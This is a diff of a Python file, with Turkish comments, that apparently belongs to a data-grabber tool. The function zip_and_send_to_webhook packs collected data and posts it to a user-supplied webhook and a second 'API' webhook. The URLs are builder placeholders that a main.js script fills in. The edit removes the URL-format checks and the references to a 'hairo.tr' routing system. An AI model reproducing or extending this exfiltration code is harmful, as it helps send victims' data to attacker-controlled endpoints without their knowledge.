@@ -535,12 +535,11 @@ def zip_and_send_to_webhook(webhook_url, api_webhook_url=None):
             'embeds': [embed_data]
         })
         
-        # Hem kullanıcı webhook'una hem de API webhook'una gönder (hairo.tr sistemi)
+        # Hem kullanıcı webhook'una hem de API webhook'una gönder
         webhooks_to_send = []
-        # hairo.tr sistemi: webhook URL'leri artık hairo.tr/key formatında olabilir
-        if webhook_url and webhook_url != '%WEBHOOK%' and (webhook_url.startswith('https://') or webhook_url.startswith('http://')):
+        if webhook_url and webhook_url != '%WEBHOOK%':
             webhooks_to_send.append(webhook_url)
-        if api_webhook_url and api_webhook_url != '%API_WEBHOOK%' and (api_webhook_url.startswith('https://') or api_webhook_url.startswith('http://')):
+        if api_webhook_url and api_webhook_url != '%API_WEBHOOK%':
             webhooks_to_send.append(api_webhook_url)
         
         if not webhooks_to_send:
@@ -590,16 +589,9 @@ if __name__ == "__main__":
         api_webhook_url = os.environ.get('API_WEBHOOK_URL')
     
     # %WEBHOOK% ve %API_WEBHOOK% placeholder'larını kontrol et (main.js replace edecek)
-    # hairo.tr sistemi: placeholder'lar main.js tarafından hairo.tr/key formatına çevrilecek
-    if webhook_url == '%WEBHOOK%' or not webhook_url:
+    if webhook_url == '%WEBHOOK%':
         webhook_url = None
-    if api_webhook_url == '%API_WEBHOOK%' or not api_webhook_url:
-        api_webhook_url = None
-    
-    # Webhook URL'lerinin geçerli format olup olmadığını kontrol et (hairo.tr veya discord webhook)
-    if webhook_url and not (webhook_url.startswith('https://') or webhook_url.startswith('http://')):
-        webhook_url = None
-    if api_webhook_url and not (api_webhook_url.startswith('https://') or api_webhook_url.startswith('http://')):
+    if api_webhook_url == '%API_WEBHOOK%':
         api_webhook_url = None
     
     if not webhook_url and not api_webhook_url:
